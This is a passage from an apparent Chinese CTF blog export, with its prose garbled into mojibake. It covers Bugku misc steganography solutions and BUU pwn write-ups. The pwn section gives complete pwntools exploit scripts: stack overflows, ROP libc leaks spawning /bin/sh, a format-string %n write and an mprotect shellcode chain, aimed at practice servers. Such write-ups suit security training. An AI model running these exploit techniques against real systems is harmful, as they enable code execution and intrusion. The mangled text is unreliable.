pingç”¨wiresharkæ‰“å¼€åå‘ç°åå…­è¿›åˆ¶æ—è¾¹ä¸€ä¸ªfï¼Œæ‰“å¼€å…¶å®ƒçš„å‘ç°ç»„åˆèµ·æ¥æ˜¯flag\n\n\n\n7 èµ›åšæœ‹å…‹æ‰“å¼€åå‘ç°å°±ä¸€ä¸ªå…‰ç§ƒç§ƒçš„åŠ å¯†æ–‡ä»¶ï¼Œä¸ç”¨çŒœéƒ½çŸ¥é“æ˜¯ä¼ªåŠ å¯†ï¼Œä¸¢è¿›winhexä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥æ‰“å¼€äº†\n\n\næ‰“å¼€æ–‡ä»¶åå‘ç°æ˜¯ä¸€å †ä¹±ç ï¼Œä¸¢è¿›winhexå‘ç°æ˜¯pngæ ¼å¼ç…§ç‰‡\n\n\nä¿®æ”¹ä¸€ä¸‹åç¼€åå›¾ç‰‡å°±å‡ºæ¥äº†ï¼Œä¸è¿‡å¥½åƒflagè¿˜æ²¡å‡ºæ¥ï¼Œå±æ€§é‡Œé¢ä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæ ¡éªŒå’Œä¹Ÿæ­£ç¡®ï¼Œbinwalkä¹Ÿæ²¡æŸ¥å‡ºé—®é¢˜\n\n\n\n\næœ€åæ¨æµ‹ä¸€ä¸ªæ˜¯lsbéšå†™ï¼Œæœä¸å…¶ç„¶ï¼Œå¾—åˆ°flag\n\n\n\n8 è´æ–¯æ‰‹æ‰“å¼€ä»‹ç»å‘ç°æ˜¯å¯¹å›¾ç‰‡ä¸Šäººç‰©ä»‹ç»ï¼Œåˆšæƒ³å…³é—­å‘ç°æœ€ä¸‹é¢è¿˜æœ‰ä¸œè¥¿ï¼Œå‘ç°å¯†ç æ˜¯å››ä½æ•°å’Œè¿™ä¸ªè´æ–¯æ‰‹æœ‰å…³\n\n\næ‡’å¾—æœç›´æ¥æš´åŠ›ç ´è§£\n\n\næ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸²åŠ å¯†å­—ç¬¦ï¼Œ5+58åº”è¯¥åŠ å¯†æ–¹å¼MD5å’Œbase58\n\n\nè§£ç å¾—åˆ°flag\n\n\n\n\n\n9 åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—æ‰“å¼€å±æ€§å‘ç°æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¸¢è¿›winhexé‡Œé¢ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆï¼Œç”¨binwalkæŸ¥çœ‹å‘ç°ç…§ç‰‡é‡Œé¢æœ‰å…¶å®ƒjpgç…§ç‰‡ï¼Œç”¨foremåˆ†ç¦»\n\n\nå‘ç°å›¾ç‰‡é‡Œé¢æœ‰flagï¼ˆä¸è¿‡è¿™ä¸ªflagæœ‰ç‚¹é•¿ï¼Œæœ‰ç‚¹ç¦»è°±ï¼‰\n\n\n\n10 çŒœç­¾åˆ°é¢˜ï¼Œç™¾åº¦è¯†å›¾ï¼Œå‘ç°æ˜¯åˆ˜äº¦è²ï¼Œå¾—åˆ°flagï¼ˆæ³¨æ„flagæ ¼å¼ï¼‰\n\n11 å®½å¸¦ä¿¡æ¯æ³„éœ²ä¸‹è½½RouterPassViewï¼Œç”¨è¿™ä¸ªæœç´¢usernameï¼ˆç”¨æˆ·åï¼‰\n\n\n\n12 éšå†™2ç›´æ¥ä¸¢è¿›winhexï¼Œå‘ç°jpgå›¾ç‰‡ç»“å°¾åé¢æœ‰å‹ç¼©åŒ…çš„å­—ç¬¦\n\n\nç”¨foremoståˆ†ç¦»å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„æ–‡ä»¶å’Œå¯†ç æç¤ºï¼Œè§£å¯†ï¼ˆç›´æ¥çˆ†ç ´ï¼Œåæ­£æ˜¯ä¸‰ä½æ•°ï¼‰å¾—åˆ°ä¸€å¼ å›¾ç‰‡\n\n\nè€è§„çŸ©ä¸¢winhexï¼Œå‘ç°æœ€åæœ‰flag\n\n\n\n13 å¤šç§æ–¹æ³•è§£å†³è¿™é“é¢˜æç¤ºè¯´æœ‰äºŒç»´ç ï¼Œæ‰“å¼€é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªexeå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå°è¯•æ‰“å¼€å‘ç°æ— æ³•è¿è¡Œï¼‰ï¼Œç›´æ¥ä¸¢winhex\n\n\nå‘ç°æ˜¯æ—è¾¹æ˜¯åŠ å¯†çš„å›¾ç‰‡ç¼–ç ï¼Œç›´æ¥åœ¨çº¿è§£ç å¾—åˆ°flag\n\n\n\n14 é—ªçš„å¥½å¿«emmmmï¼Œè¿™é“é¢˜æŒºç®€å•çš„å°±æ˜¯å¥½çƒ¦ï¼Œç”¨Stegsolve.jarä¸€å¸§ä¸€å¸§çœ‹ï¼Œæ‰«ç ï¼Œflagå°±å‡ºæ¥äº†\n\n15 come_gameæ‰“å¼€åæ˜¯ä¸ªæ¸¸æˆï¼Œæ¯æ¬¡æ­»äº¡éƒ½ä¼šå¤šä¸ªæ–‡ä»¶ï¼Œæ‰¾åˆ°save1å°†å®ƒä¸¢å°½winhexé‡Œé¢ï¼Œå°†2ACæ”¹æˆ5ACåœ¨è¿›æ¸¸æˆå°±å¯ä»¥å¾—åˆ°flagï¼Œå½“ç„¶å¦‚æœè§‰å¾—èƒ½é—¯è¿‡å»ä¹Ÿåº”è¯¥èƒ½å¾—åˆ°flagã€‚ï¼ˆæˆ‘æ²¡è¯•è¿‡ï¼Œä¸ç¡®å®šèƒ½ä¸èƒ½è¡Œï¼Œæé†’ä¸€ä¸‹è¿™ä¸ªæ¸¸æˆæ‰“å¼€äº†å¥½åƒä¸èƒ½å…³é—­ï¼‰\n\n\n\n16 ç™½å“¥çš„é¸½å­ç›´æ¥ä¸¢è¿›winhexé‡Œé¢ï¼Œå‘ç°ç…§ç‰‡ç»“å°¾åé¢å¤šå‡ºä¸€äº›å­—ç¬¦ï¼Œåˆ†æä¸€ä¸‹å°±çŸ¥é“æ˜¯æ …æ åŠ å¯†\n\n\nè§£å¯†ï¼ˆå¯†åŒ™æˆ‘æ˜¯ä¸€ä¸ªä¸€ä¸ªè¯•çš„ï¼Œä¸è¿‡è¿˜å¥½å°±æ˜¯3ï¼Œåé¢æ‰çŸ¥é“é‚£ä¸ªæç¤ºâ€œå’•å’•å’•â€å¥½åƒå°±ä»£è¡¨key=3ï¼‰\n\n","slug":"bugku misc","date":"2021-10-16T13:24:11.000Z","categories_index":"åˆ·é¢˜","tags_index":"misc","author_index":"Krito"},{"id":"9c4b020a9215e27197217b9ca10cd6d8","title":"BUU pwn","content":"åŸç†æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯\n\nç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚\nå†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚\n\nripæ€è·¯é¦–å…ˆæŸ¥çœ‹é™„ä»¶ï¼Œå‘ç°æ²¡å¼€ä»€ä¹ˆä¿æŠ¤ï¼Œä¸¢è¿›IDAé‡Œé¢çœ‹ä¸€ä¸‹\n\nå‘ç°å¯ç–‘å‡½æ•°ï¼ˆfunï¼‰ï¼Œç‚¹è¿›å»å¯ä»¥å‘ç°å‡½æ•°è°ƒç”¨äº†/bin/shï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°å¾—åˆ°flag\nå¼€å§‹è°ƒè¯•ã€‚é¦–å…ˆåˆ›é€ ä¸€ä¸ªé•¿åº¦ä¸º150çš„å­—ç¬¦ä¸²ï¼Œè¿è¡Œè¯¥é™„ä»¶ï¼Œå°†é‚£ä¸ªå­—ç¬¦ä¸²è¾“å…¥è¿›å»\nä¹‹åç¨‹åºç›´æ¥æŠ¥é”™ï¼Œå› ä¸ºreturnåœ°å€å¤„ä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„åœ°å€å€¼ï¼Œæ— æ³•è·³è½¬ã€‚é€šè¿‡returnçš„é‚£ä¸ªåœ°å€å€¼ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—returnè·ç¦»è¾“å…¥ç‚¹çš„é•¿åº¦ã€‚ä½¿ç”¨cyclicè®¡ç®—åç§»é‡\nå¾—åˆ°åç§»é‡å°±å¯ä»¥å†™expäº†\nEXP123456from pwn import *p = remote(&#x27;node3.buuoj.cn&#x27;,28652)fun = 0x401186payload = &#x27;a&#x27;*23+p64(fun+1)  //å¹³è¡¡å †æ ˆp.sendline(payload)p.interactive()\n\nwarmup_csaw_2016æ€è·¯ä¹Ÿæ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºï¼Œæ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå…ˆæŸ¥çœ‹ä¿æŠ¤ï¼Œè¿˜æ˜¯ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡æœ‰å¼€\nä¸¢è¿›IDAæŸ¥çœ‹ï¼Œå°±æ˜¯è¾“å‡ºä¸¤ä¸ªè¯­å¥å’Œä¸€ä¸ªå‡½æ•°åœ°å€ï¼ŒæŸ¥çœ‹å‡½æ•°ï¼Œå‘ç°æ˜¯æ‰“å¼€flagæ–‡ä»¶ã€‚æ€è·¯ç«‹åˆ»å°±æœ‰äº†ï¼Œå› ä¸ºæ˜¯getså‡½æ•°æ²¡æœ‰é™åˆ¶è¾“å…¥ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥è·å¾—flagã€‚æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥è¦è®¡ç®—åç§»é‡\nè¿˜æ˜¯å’Œä¸Šé¢ä¸€é¢˜ä¸€æ ·çš„æ–¹æ³•è®¡ç®—åç§»é‡\n\nEXP12345from pwn import *p=remote(&#x27;node3.buuoj.cn&#x27;,26972)payload=&#x27;a&#x27;*0x40+&#x27;a&#x27;*8+p64(0x40060D)p.sendline(payload)p.interactive()\n\nciscn_2019_n_1æ€è·¯æ£€æŸ¥å¼€äº†ä»€ä¹ˆä¿æŠ¤ï¼Œå‘ç°åªå¼€äº†NXï¼Œå…¶å®ƒæ²¡æœ‰å¼€ï¼Œä¹Ÿå°±æ˜¯æ•°æ®æ®µä¸å¯æ‰§è¡Œ\næ‰”è¿›IDAæŸ¥çœ‹ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨äº†funcå‡½æ•°ï¼Œç‚¹è¿›funcå‡½æ•°ï¼Œå‡½æ•°å…ˆæ˜¯å°†ç”¨æˆ·è¾“å…¥çš„å€¼èµ‹äºˆç»™v1ï¼Œä¹‹ååˆ¤æ–­v2æ˜¯å¦ç­‰äº11.28125ï¼Œå¦‚æœç­‰äºå°±å¯ä»¥å¾—åˆ°flagï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯è®¡ç®—v1å’Œv2ç›¸å·®å¤šå°‘ï¼Œå†åˆ©ç”¨getså‡½æ•°å°†v2è¦†ç›–ä¸º11.28125\n\nå› ä¸º11.28125åœ¨å†…å­˜ä¸­æ˜¯ä»¥åå…­è¿›åˆ¶å­˜å‚¨ï¼Œæ‰€ä»¥è¦å°†11.28125è½¬æˆåå…­è¿›åˆ¶\nEXP12345from pwn import *p = remote(&#x27;node3.buuoj.cn&#x27;,25675)payload = â€˜a&#x27; *(0x30-0x4) + p64(0x41348000)p.sendline(payload)p.interactive()\n\npwn1_sctf_2016è¿›å…¥IDAå‘ç°å­˜åœ¨åé—¨å‡½æ•°å’Œfgetså‡½æ•°ï¼Œä¸è¿‡fgetså‡½æ•°é™åˆ¶äº†é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦æ— æ³•é€ æˆæº¢å‡ºã€‚ä½†æ˜¯åœ¨åé¢å‘ç°std::string::stringå‡½æ•°ï¼Œè™½ç„¶ä¸çŸ¥é“æ˜¯å¹²ä»€ä¹ˆçš„ä½†æ˜¯æ ¹æ®åç§°çŒœæµ‹å¯èƒ½æ˜¯ç”±æŸå­—ç¬¦ä¸²è½¬å˜æˆå¦ä¸€å­—ç¬¦ä¸²\n\nè¿›å…¥gdbè°ƒè¯•ï¼Œå‘ç°è¾“å…¥çš„Iç»è¿‡std::string::stringå‡½æ•°ä¼šè½¬å˜æˆyouï¼Œæ¢å¥è¯è¯´ä¹Ÿå°±æ˜¯1å’Œå­—ç¬¦è½¬æˆ3ä¸ªå­—ç¬¦ï¼Œè€Œè¦é€ æˆæ ˆæº¢å‡ºéœ€è¦0x3cå¦‚æœé€šè¿‡è½¬åŒ–å¯ä»¥è¾¾åˆ°è¦æ±‚ï¼Œä¹Ÿå°±æ˜¯éœ€è¦20ä¸ªâ€™Iâ€™\n\nä¹‹åå°±å¾ˆç®€å•äº†ï¼Œé€šè¿‡è½¬æ¢é€ æˆæ ˆæº¢å‡ºï¼Œè·³è½¬åˆ°åé—¨å‡½æ•°è·å–shell\nEXP1234567from pwn import *#p = process(&#x27;./pwn1_sctf_2016&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,26513)get_shell = 0x8048F13payload1 = &#x27;I&#x27;*20+&#x27;a&#x27;*4+p32(get_shell)p.sendline(payload1)p.interactive()\n\n\njarvisoj_level0ç®€å•çš„æ ˆæº¢å‡ºï¼Œç›´æ¥ä¸Šexp\nEXP123456from pwn import *p = process(&#x27;./level0&#x27;)get_shell = 0x40059Apayload1 = &#x27;a&#x27;*0x88+p64(get_shell)p.sendline(payload1)p.interactive()\n\n\n\nciscn_2019_c_1ä½¿ç”¨IDAæ‰“å¼€ï¼Œåœ¨åŠ å¯†å‡½æ•°ä¸­å­˜åœ¨å±é™©å‡½æ•°getsï¼Œå¯ä»¥é€ æˆæ ˆæº¢å‡ºã€‚å› ä¸ºæ²¡æœ‰systemä»¥åŠbin/shå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥é‡‡å–libcæ³„éœ²æ¥åšæ­¤é¢˜\n\næ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯è¿è¡Œä¸¤æ¬¡ï¼Œå…ˆæ³„éœ²å‡½æ•°åœ°å€è·å¾—libcï¼Œè®¡ç®—å¾—åˆ°systemå‡½æ•°å’Œbin/shå­—ç¬¦ä¸²åœ°å€ï¼Œç¬¬äºŒæ¬¡è¿è¡Œæ‰§è¡Œsystemå‡½æ•°è·å¾—shell\npayload1:\n1payload1=&quot;A&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)\n\npayload2:\n1payload2=&quot;A&quot;*88+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)\n\np64(ret_addr)ï¼šç›®çš„æ˜¯è®©å †æ ˆå¯¹é½\nEXP12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;p=process(&#x27;./ciscn_2019_c_1&#x27;)#p=remote(&#x27;node4.buuoj.cn&#x27;,25488)elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]start_addr=elf.symbols[&quot;_start&quot;]pop_rdi_addr=0x400c83p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)payload1=&quot;A&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)p.sendline(payload1)#gdb.attach(p,&#x27;b  main&#x27;)p.recvuntil(&quot;Ciphertext\\n&quot;)p.recvuntil(&quot;\\n&quot;)puts_addr=u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))p.info(&#x27;puts_addr==&gt;%#x&#x27;,puts_addr)libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase=puts_addr-libc.dump(&quot;puts&quot;)print libcbase#gdb.attach(p,&#x27;b  main&#x27;)system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)ret_addr=0x4006b9payload2=&quot;A&quot;*88+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)p.sendline(payload2)p.interactive()\n\nciscn_2019_n_832ä½ç¨‹åºï¼Œæœ‰ä¸€ä¸ªè¾“å…¥ï¼Œä¹‹ååˆ¤æ–­var[13]æ˜¯å¦ç­‰äº17ï¼Œå¦‚æœç­‰äº17å°±æ‰§è¡Œsystemå‡½æ•°ï¼Œè€Œæˆ‘ä»¬çš„è¾“å…¥ä¼šå­˜å‚¨åˆ°varä¸­ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬è¾“å…¥åˆ°var[13]æ—¶çš„å€¼ä¸º17å°±å¯ä»¥\n\nEXP123456from pwn import *#p = process(&#x27;./ciscn_2019_n_8&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27044)payload = p32(0)*13+p32(17)p.sendlineafter(&quot;What&#x27;s your name?&quot;,payload)p.interactive()\n\nnot_the_same_3dsctf_2016æŸ¥çœ‹åæ±‡ç¼–ä»£ç ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡ºï¼ŒåŒæ—¶è¿˜å­˜åœ¨åé—¨å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¯»å–flag.txtæ–‡ä»¶åˆ°fl4gåœ°å€ã€‚\nä¸ä»…å¦‚æ­¤ï¼Œç¨‹åºè¿˜å­˜åœ¨writeå‡½æ•°\næ‰€ä»¥æ€è·¯å°±æ˜¯é€šè¿‡æ ˆæº¢å‡ºè·³è½¬åˆ°åé—¨å‡½æ•°ä¹‹åæ‰§è¡Œwriteå‡½æ•°æ³„éœ²å¯¹åº”åœ°å€çš„flag\nEXP12345678910from pwn import *#p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,26667)elf = ELF(&#x27;not_the_same_3dsctf_2016&#x27;)flag = 0x80ECA2Dget_flag = 0x80489A0write_addr = 0x806E270payload = &#x27;a&#x27;*45+p32(get_flag)+p32(write_addr)+&#x27;a&#x27;*4+p32(1)+p32(flag)+p32(45)p.sendline(payload)p.interactive()\n\nbabyropæ‹¿åˆ°é¢˜ç›®åˆ†æç¨‹åºï¼Œé¦–å…ˆç¨‹åºä¼šä»/dev/urandomè¯»å–éšæœºæ•°ï¼Œå†™å…¥åˆ°bufä¸­\n\næ¥ä¸‹æ¥ä¼šå°†éšæœºæ•°å†™å…¥sä¸­ï¼Œå†å°†æˆ‘ä»¬è¾“å…¥çš„æ•°å†™åˆ°bufä¸­ï¼Œæ¯”è¾ƒbufå’Œsï¼Œå¦‚æœä¸åŒå°±é€€å‡ºï¼Œç›¸åŒå°±è¿”å›v5\n\næ¥ä¸‹æ¥åˆ¤æ–­v5æ˜¯å¦ç­‰äº127ç­‰äºå°±å…è®¸è¾“å…¥0xc8ä¸ªå­—èŠ‚ï¼Œä¸åŒå°±è¾“å…¥v5ä¸ªå­—èŠ‚\n\nå¾ˆæ˜æ˜¾ï¼Œåœ¨åˆ¤æ–­v5æ—¶å­˜åœ¨æ ˆæº¢å‡ºï¼Œåªè¦v5å¤Ÿå¤§å°±å¯ä»¥è¦†ç›–è¿”å›åœ°å€ã€‚æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•é€šè¿‡strncmpå‡½æ•°ä»¥åŠä¿®æ”¹v5çš„å€¼ã€‚strncmpåŒ¹é…ä¸¤ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœä¸€æ ·å°±è¿”å›0ï¼Œä½†æ˜¯é‡åˆ°\\x00å°±ä¼šåœæ­¢è¯»å–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å…¥\\x00ä»è€Œç»•è¿‡strncmpå‡½æ•°ã€‚\n\nå¾ˆæ˜æ˜¾ï¼Œè¾“å…¥bufæ—¶å¯ä»¥è¦†ç›–v5ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æº¢å‡ºæ¥ä¿®æ”¹v5ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚æœ€åå°±æ˜¯ç®€å•çš„libcæ³„éœ²äº†ã€‚\nEXP1234567891011121314151617181920212223242526from pwn import *r=process(&#x27;./babyrop&#x27;)#r=remote(&#x27;node4.buuoj.cn&#x27;,29817)elf=ELF(&#x27;./babyrop&#x27;)write_plt=elf.plt[&#x27;write&#x27;]read_got=elf.got[&#x27;read&#x27;]read_plt=elf.plt[&#x27;read&#x27;]main_addr=0x8048825libc=ELF(&#x27;/home/krito/CTF/libc-2.23.so&#x27;)   # ä½¿ç”¨é¢˜ç›®ç»™çš„libcï¼Œæœ¬åœ°è°ƒè¯•æ—¶ç”¨è‡ªå·±çš„payload1=&#x27;\\x00&#x27;+&#x27;a&#x27;*0x6+&#x27;\\xff&#x27;r.sendline(payload1)r.recvuntil(&#x27;Correct\\n&#x27;)payload=&#x27;a&#x27;*0xe7+&#x27;b&#x27;*0x4payload+=p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(0x8)r.sendline(payload)read_addr=u32(r.recv(4))print(&#x27;[+]read_addr: &#x27;,hex(read_addr))libc_base=read_addr-libc.sym[&#x27;read&#x27;]system_addr=libc_base+libc.sym[&#x27;system&#x27;]bin_sh_addr=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()r.sendline(payload1)r.recvuntil(&#x27;Correct\\n&#x27;)payload=&#x27;a&#x27;*0xe7+&#x27;b&#x27;*0x4payload+=p32(system_addr)+&#x27;a&#x27;*4+p32(bin_sh_addr)r.sendline(payload)r.interactive()\n\npwn5ä¸€é“å…¸å‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ï¼Œç¨‹åºä¼šè¯»å–éšæœºæ•°åˆ°unk_804C044ï¼Œä¹‹åå’Œæˆ‘ä»¬è¾“å…¥çš„passwdè¿›è¡Œå¯¹æ¯”ï¼Œä¸€æ ·å°±å¯ä»¥è·å–shell\n\nè™½ç„¶æ²¡æœ‰æ ˆæº¢å‡ºï¼Œä½†æ˜¯å­˜åœ¨å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æˆ‘ä»¬å¯ä»¥å°†unk_804C044ä¸­çš„å€¼ä¿®æ”¹æˆæˆ‘ä»¬æƒ³ä¿®æ”¹çš„å€¼ï¼Œä¹‹åå†è¾“å…¥é‚£ä¸ªå€¼å°±å¯ä»¥ã€‚\nè®¡ç®—åç§»\n\næ‰€ä»¥payload=p32(target_addr) + â€˜%10$nâ€™ï¼Œè¿™æ ·ç›®æ ‡åœ°å€é‡Œé¢çš„å€¼å°±ä¼šè¢«ä¿®æ”¹æˆ00000004ï¼Œå› ä¸ºp32(target_addr) æ˜¯4å­—èŠ‚ï¼Œ$nä¿®æ”¹4å­—èŠ‚ã€‚\nEXP12345678from pwn import *#p = process(&#x27;./pwn5&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,28301)target_addr = 0x0804C044payload = p32(target_addr) + &#x27;%10$n&#x27;p.sendline(payload)p.sendline(str(0x00000004))p.interactive()\n\n\n\nget_started_3dsctf_2016ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºï¼Œæœ¬åœ°ä¹Ÿæ‰“é€šäº†ï¼Œä½†æ˜¯è¿œç«¯æ‰“ä¸é€šï¼Œåé¢å‘ç°åé—¨å‡½æ•°æ˜¯å‡çš„ï¼Œè¿œç«¯æ²¡æœ‰flag.txtï¼Œæ‰€ä»¥å¾—æ¢ä¸€ç§æ€è·¯ã€‚\nçœ‹åˆ°å‡½æ•°åˆ—è¡¨é‡Œé¢å­˜åœ¨mprotectå‡½æ•°ï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŒ‡å®šå†…å­˜æ®µä¸ºå¯æ‰§è¡Œã€‚ä¹‹åæ§åˆ¶ç¨‹åºå»æ‰§è¡Œæˆ‘ä»¬è®¾è®¡å¥½çš„å†…å­˜æ®µã€‚\nå¯»æ‰¾å¯å†™å†…å­˜æ®µ\n\nå¯»æ‰¾ç”¨äºå¹³è¡¡å †æ ˆçš„gadgetsï¼ˆå› ä¸ºmprotectå‡½æ•°å’Œreadå‡½æ•°å‚æ•°ä¸ªæ•°éƒ½æ˜¯3ï¼Œæ‰€ä»¥éœ€è¦ä¸‰ä¸ªpopï¼‰\n\næ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯æ˜¯ï¼š\n\næ§åˆ¶è¿”å›åœ°å€ä¸ºmprotectï¼Œåˆ©ç”¨mprotectå‡½æ•°ä¿®æ”¹æŒ‡å®šå†…å­˜çš„æƒé™ï¼Œç„¶åå¹³è¡¡å †æ ˆ\nå°†mprotectå‡½æ•°çš„è¿”å›åœ°å€ä¿®æ”¹æˆreadï¼Œåˆ©ç”¨readå‡½æ•°å‘ç›®æ ‡æ®µå†™å…¥shellcode\næœ€ååˆ©ç”¨readå‡½æ•°è¿”å›åˆ°è®¾è®¡å¥½çš„å†…å­˜æ®µ\n\nEXP1234567891011121314151617181920212223242526272829303132from pwn import *elf = ELF(&#x27;./get_started_3dsctf_2016&#x27;)sh = elf.process()#sh = remote(&#x27;node4.buuoj.cn&#x27;, 25586)sh = process(&#x27;./get_started_3dsctf_2016&#x27;)mem_addr = 0x80ea000 pop3_ret = 0x809e4c5  # ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27;mem_size = 0x1000    mem_proc = 0x7       mprotect_addr = elf.symbols[&#x27;mprotect&#x27;]read_addr = elf.symbols[&#x27;read&#x27;]# æ§åˆ¶è¿”å›åœ°å€ä¸ºmprotectï¼Œåˆ©ç”¨mprotectå‡½æ•°ä¿®æ”¹æŒ‡å®šå†…å­˜çš„æƒé™payload = &#x27;A&#x27; * 0x38 payload += p32(mprotect_addr)payload += p32(pop3_ret)  # å¹³è¡¡å †æ ˆpayload += p32(mem_addr)  payload += p32(mem_size)payload += p32(mem_proc)  payload += p32(read_addr) # å°†mprotectå‡½æ•°çš„è¿”å›åœ°å€ä¿®æ”¹æˆreadï¼Œæ‰§è¡Œreadå‡½æ•°payload += p32(pop3_ret)  # å¹³è¡¡å †æ ˆpayload += p32(0)    payload += p32(mem_addr)   payload += p32(0x100)# è¿”å›åˆ°æˆ‘ä»¬æ„é€ å¥½çš„å†…å­˜æ®µpayload += p32(mem_addr)  sh.sendline(payload)payload_sh = asm(shellcraft.sh(),arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) sh.sendline(payload_sh)sh.interactive() \n\nbjdctf_2020_babystackå°±æ˜¯ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºï¼Œç¬¬ä¸€æ¬¡è¾“å…¥çš„å€¼ä½œä¸ºç¬¬äºŒæ¬¡è¾“å…¥çš„æœ€å¤§å€¼ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡è¾“å…¥è¾ƒå¤§çš„å€¼ï¼Œç¬¬äºŒæ¬¡æ ˆæº¢å‡ºåˆ°åé—¨å‡½æ•°å°±å¯ä»¥ã€‚ï¼ˆç¬¬ä¸€æ¬¡ä¸è¦å¤ªå¤§ï¼Œæˆ‘ç”¨0x100å°±æŠ¥é”™äº†ï¼‰\nEXP12345678910from pwn import *#p = process(&#x27;./bjdctf_2020_babystack&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27736)backdoor = 0x4006E6payload1 = &#x27;100&#x27;payload2 = &#x27;a&#x27;*0x18+p64(backdoor)p.sendlineafter(&#x27;[+]Please input the length of your name:\\n&#x27;,payload1)p.sendlineafter(&quot;[+]What&#x27;s u name?\\n&quot;,payload2)p.interactive()\n\n\n2018_ropIDAæ‰“å¼€å‘ç°ç¬¬äºŒä¸ªå‡½æ•°å°±å­˜åœ¨æ 